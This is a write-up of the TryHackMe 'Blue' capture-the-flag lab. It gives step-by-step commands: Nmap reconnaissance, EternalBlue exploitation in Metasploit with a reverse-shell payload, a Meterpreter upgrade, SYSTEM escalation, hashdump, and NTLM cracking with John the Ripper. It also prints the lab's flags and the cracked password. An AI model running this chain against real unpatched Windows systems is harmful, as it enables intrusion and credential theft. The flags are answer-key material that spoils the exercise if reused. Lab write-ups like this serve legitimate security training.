# TryHackMe — Blue

| Field          | Details                                           |
|----------------|---------------------------------------------------|
| **Platform**   | TryHackMe                                         |
| **Room**       | [Blue](https://tryhackme.com/room/blue)           |
| **Difficulty** | Easy                                              |
| **OS**         | Windows                                           |
| **Category**   | Exploitation, Privilege Escalation                |
| **Tags**       | Metasploit, EternalBlue, MS17-010, Hash Cracking  |
| **Completed**  | June 2026                                         |

---

## Overview

Deploy and hack into a Windows machine by leveraging a well-known SMB vulnerability. This room walks through a full exploitation chain — from scanning and vulnerability discovery all the way to privilege escalation and credential dumping. The core vulnerability is **MS17-010 (EternalBlue)**, one of the most famous exploits in cybersecurity history, used in the real-world WannaCry ransomware attack.

---

## Environment

- **Attacker machine:** TryHackMe AttackBox (in-browser Kali Linux)
- **Target machine:** TryHackMe-hosted Windows victim box
- **Connection:** TryHackMe VPN / in-browser lab

---

## Task 1 — Reconnaissance (Nmap)

Start with a port scan to identify open services.

```bash
nmap -p 1-999 <TARGET_IP>
```

**Open ports found (under 1000):**

| Port    | Service     |
|---------|-------------|
| 135/tcp | RPC         |
| 139/tcp | NetBIOS     |
| 445/tcp | SMB         |

Port 445 (SMB) is the key finding. To check specifically what vulnerabilities the machine is exposed to:

```bash
nmap --script vuln -p 445 <TARGET_IP>
```

**Result:** Machine is vulnerable to **ms17-010 (EternalBlue)** — a critical SMB remote code execution vulnerability.

---

## Task 2 — Exploitation (Metasploit + EternalBlue)

Use Metasploit to exploit the MS17-010 vulnerability and get an initial shell.

**Step 1 — Launch Metasploit:**
```bash
msfconsole
```

**Step 2 — Search for the EternalBlue module:**
```bash
search ms17-010
```
The module we need: `exploit/windows/smb/ms17_010_eternalblue`

**Step 3 — Load the exploit:**
```bash
use exploit/windows/smb/ms17_010_eternalblue
```

**Step 4 — Check required options:**
```bash
show options
```
The required field is `RHOSTS` (the target IP).

**Step 5 — Set the target:**
```bash
set RHOSTS <TARGET_IP>
```

**Step 6 — Set the payload:**
```bash
set payload windows/x64/shell/reverse_tcp
```

**Step 7 — Run the exploit:**
```bash
run
```

✅ A reverse shell is returned. Press Enter if the DOS shell doesn't appear immediately. Background the shell with `CTRL + Z`.

---

## Task 3 — Privilege Escalation (Shell → Meterpreter → SYSTEM)

Upgrade the basic shell to a Meterpreter session for more powerful post-exploitation capabilities.

**Step 1 — Find the shell upgrade module:**
```bash
search shell_to_meterpreter
```
Module path: `post/multi/manage/shell_to_meterpreter`

**Step 2 — Load and configure it:**
```bash
use post/multi/manage/shell_to_meterpreter
show options
```
The required option is `SESSION`.

**Step 3 — Set the session and run:**
```bash
set SESSION 1
run
```

**Step 4 — Switch to the new Meterpreter session:**
```bash
sessions
sessions -i 2
```

**Step 5 — Verify SYSTEM privileges:**
```bash
getsystem
shell
whoami
```
Output confirms: `NT AUTHORITY\SYSTEM` — full control of the machine.

Background the shell (`CTRL + Z`) and return to Meterpreter.

**Step 6 — Migrate to a stable SYSTEM process:**

List running processes and find one running as NT AUTHORITY\SYSTEM:
```bash
ps
```

Migrate to a stable process (e.g., spoolsv.exe):
```bash
migrate <PROCESS_ID>
```

> **Note:** Migration can be unstable. If it fails, try a different SYSTEM process or restart the exploit.

---

## Task 4 — Credential Dumping & Password Cracking

**Step 1 — Dump password hashes:**
```bash
hashdump
```

Non-default user found: **jon**

**Step 2 — Crack the hash with John the Ripper:**

Save the hash to a file, then:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

✅ Password cracked: `alqfna22`

---

## Task 5 — Flag Collection

Three flags are hidden in key locations on the Windows system.

**Flag 1 — System root (`C:\`):**
```bash
type C:\flag1.txt
```
> 🚩 `flag{access_the_machine}`

**Flag 2 — Windows password storage location:**
```bash
type C:\Windows\System32\config\flag2.txt
```
> 🚩 `flag{sam_database_elevated_access}`

**Flag 3 — Administrator's documents:**
```bash
type C:\Users\Jon\Documents\flag3.txt
```
> 🚩 `flag{admin_documents_can_be_valuable}`

---

## Attack Chain Summary

```
Nmap Port Scan → Port 445 (SMB) Open
        ↓
Nmap Vuln Script → MS17-010 (EternalBlue) Confirmed
        ↓
Metasploit → exploit/windows/smb/ms17_010_eternalblue
        ↓
Reverse Shell Obtained
        ↓
Shell → Meterpreter Upgrade (shell_to_meterpreter)
        ↓
getsystem → NT AUTHORITY\SYSTEM
        ↓
Process Migration (stable SYSTEM process)
        ↓
hashdump → jon's NTLM hash
        ↓
John the Ripper → Password: alqfna22
        ↓
3 Flags Collected
```

---

## Tools Used

| Tool             | Purpose                                          |
|------------------|--------------------------------------------------|
| Nmap             | Port scanning & vulnerability detection          |
| Metasploit       | EternalBlue exploitation framework               |
| shell_to_meterpreter | Shell upgrade for post-exploitation          |
| hashdump         | Windows credential extraction                    |
| John the Ripper  | NTLM hash cracking                               |

---

## Key Lessons Learned

1. **MS17-010 is a critical unpatched vulnerability.** EternalBlue affects unpatched Windows systems and enables unauthenticated remote code execution via SMB. Always patch your systems.
2. **Nmap vuln scripts reveal exploitable CVEs.** Running `--script vuln` during recon can directly surface known vulnerabilities without manual research.
3. **A basic shell is just the start.** Upgrading to Meterpreter unlocks far more powerful post-exploitation capabilities like `hashdump`, `getsystem`, and process migration.
4. **NTLM hashes are crackable.** Windows stores passwords as NTLM hashes. Weak passwords like `alqfna22` fall quickly against `rockyou.txt`.
5. **Process migration matters.** Running from an unstable process can get you kicked out — always migrate to a stable SYSTEM process after escalation.
6. **Sensitive data lives in predictable places.** SAM database, system root, and administrator documents are always high-value targets in a Windows pentest.

---

## References

- [TryHackMe — Blue Room](https://tryhackme.com/room/blue)
- [MS17-010 CVE Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144)
- [Metasploit Documentation](https://docs.metasploit.com/)
- [John the Ripper](https://www.openwall.com/john/)